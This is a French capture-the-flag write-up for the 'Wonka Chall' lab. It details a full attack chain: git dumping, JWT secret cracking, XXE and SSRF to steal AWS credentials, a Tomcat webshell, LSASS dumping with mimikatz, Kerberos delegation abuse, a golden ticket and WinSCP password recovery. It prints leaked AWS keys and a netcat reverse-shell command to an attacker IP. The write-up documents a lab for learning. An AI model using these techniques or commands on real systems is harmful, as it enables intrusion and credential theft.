# Wonka Chall

> Akerva

> https://willywonka.shop

## Step 1

More detail: [Step1](./step1.md)

1. dirsearch -> .git
2. GitTools -> dumper -> extractor
3. Flag 1 dans .git/COMMIT_EDITMSG

> 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009

## Step 2

More detail: [Step2](./step2.md)

1. trouver le debug=1 dans le .git
2. aller sur la page /reset
3. bf les user -> trouver test
4. https://willywonka.shop/reset?debug=1 -> un jwt + backend.willywonka.shop dans la stacktrace
5. dirsearch sur le backend -> on trouve encore un /reset -> /reset?debug=1 -> set cookie : backend-session=jwt vide
6. bf avec rockyou le secret du jwt qu'on récup dans la stacktrace -> s3cr3t
7. refaire un jwt sur jwt.io avec un compte validateur (genre aas) et une expiration lointaine -> https://backend.willywonka.shop/reset/jwt_craft 
8. faire la meme que etape 4 mais avec le user aas pour se co avec
9. chercher le ticket "deadbeef" et flag

> 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318

## Step 3

More detail: [Step3](./step3.md)

1. réussir à trig la xxe via svg : [rest.svg](./step3/rect.svg)
2. upload [ro.svg](./step3/ro.svg) à l'adresse : http://willywonka.shop/profile?filetype=image%2fsvg%2bxml ==> XXE OOB
3. mettre `aas` en nom de victime et du garbage pour le reste
4. copier coller l'id du ticket dans le backend -> les logs du python server commencent à bouger
5. cliquer sur autoresize

> 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630


## Step 4

More detail: [Step4](./step4.md)

1. pour chopper les creds du bucket, il faut taper sur http://169.254.169.254/latest/meta-data/iam/security-credentials/ grâce à la xxe
2. récupérer les infos du bucket : http://169.254.169.254/latest/dynamic/instance-identity/document
3. set les variables d'env : AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN
4. aws s3 ls s3://willywonka-shop
5. aws s3 cp s3://willywonka-shop/Flag-04.txt .

> 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528

## Step 5

More detail: [Step5](./step5.md)

1. se connecter au vpn et checker les routes, voir : 172.16.42.0/32
2. dirsearch avec la wordlist tomcat de seclist -> voir /host-manager/
3. se connecter avec les creds tomcat : tomcat
4. monter un partage "data" avec un webshell en bite.war dedans
5. déployer cette nouvelle appli via les UNC path
6. y accéder : http://maki-lab:8080/bite/index.jsp?cmd=whoami
7. reverse shell -> flag

> 8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8

## Step 6

More detail: [Step6](./step6.md)

1. upload procdump.exe sur la machine
2. récupérer le minidump de lsass.exe
3. récupérer les creds avec mimikatz en local
4. trouver le mot de passe en claire de adminserv

> 87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4

## Step 7 

More detail: [Step7](./step7.md)

1. lister les shares accessibles avec les shares -> trouver le shares "Users" sur 172.16.42.5
2. le monter en local
3. aller récupérer des identifiants et un flag

> 5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C

## Step 8

More detail: [Step8](./step8.md)

1. relier une vm windows qu'on connait à l'ad
2. faire un bloodhound
3. remarquer que c'est du resources based constrained delegation
4. ajouter une machine avec un spn controlé
5. modifier la valeur de msDS-AllowedToActOnBehalfOfOtherIdentity
6. impersonate administrator sur le dc grâce à rubeus (s4u)
7. psexec avec le user impersonate
8. récupérer le ntds.dit (vssadmin)
9. récupérer le hash de krbtgt

> 24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5

## Step 9

More detail: [Step9](./step9.md)

1. créer un golden ticket
2. tenter psexec avec, sinon faire du pth avec adminWorkstation
3. voir que la machine utilise winscp
4. récupérer le hash réversible de veruca dans la clé de registre
5. récupérer le password
6. se connecter via winscp avec les creds
7. ajouter une route vers la machine de veruca
8. s'y connecter en ssh

> 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2

## Resources

1. GitTools : https://github.com/internetwache/GitTools.git
2. Seclist, username shortlist : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
3. jwt checker : https://jwt.io/
4. jwt_tool : https://github.com/ticarpi/jwt_tool
5. jwt encoder / decoder : https://www.jsonwebtoken.io/
6. lfi and ssrf via xxe : https://hackerone.com/reports/347139
7. xxe oob : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
8. s3 bucket ssrf metadata : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
9. exploitation s3 via ssrf : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/
10. exploitation host-manager tomcat : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
11. extract sam security : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
12. extract minidump + creds : https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/
13. red team creds dumping : https://ired.team/offensive-security/credential-access-and-credential-dumping
14. resources based constrained delegation attacke by pixis : https://beta.hackndo.com/resource-based-constrained-delegation-attack/
15. rbcd attack par harmj0y : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
16. exploitation détaillé de rbcd : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
17. relaying kerberos - hacing fun with constained delegation : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
18. Récup le ntds : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
19. où sont cachés les creds winscp : https://superuser.com/questions/100503/where-does-winscp-store-sites-password
20. outil pour décoder le password : https://github.com/anoopengineer/winscppasswd/releases

---

## Useful command used

* dirsearch

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://willywonka.shop/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25
```

* gittools

```bash
/opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ git_out
/opt/t/pentest/exploit/GitTools/Extractor/extractor.sh git_out git_extract
```

* jwt_tool

```bash
python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt
```

* aws

```bash
export AWS_ACCESS_KEY_ID=ASIAZ47IG35A4F6ZY2ML
export AWS_SECRET_ACCESS_KEY=bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn
export AWS_DEFAULT_REGION=eu-west-3                                  
export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=

aws s3 ls                                      
aws s3 ls s3://willywonka-shop
aws s3 cp s3://willywonka-shop/Flag-04.txt .
```

* port scan

```
IP='172.16.42.101'
sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 $IP | tee out_mass
PORT=`cat out_mass | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','`
sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p$PORT $IP
```

* smb server

```bash
sudo smbserver.py -smb2support -debug -comment "data" data .
```

* reverse shell

```bash
rlwrap ncat -klvp 12345
```

* exec à distance

```
\\10.8.0.26\data\nc.exe -e cmd.exe 10.8.0.26 12345
```
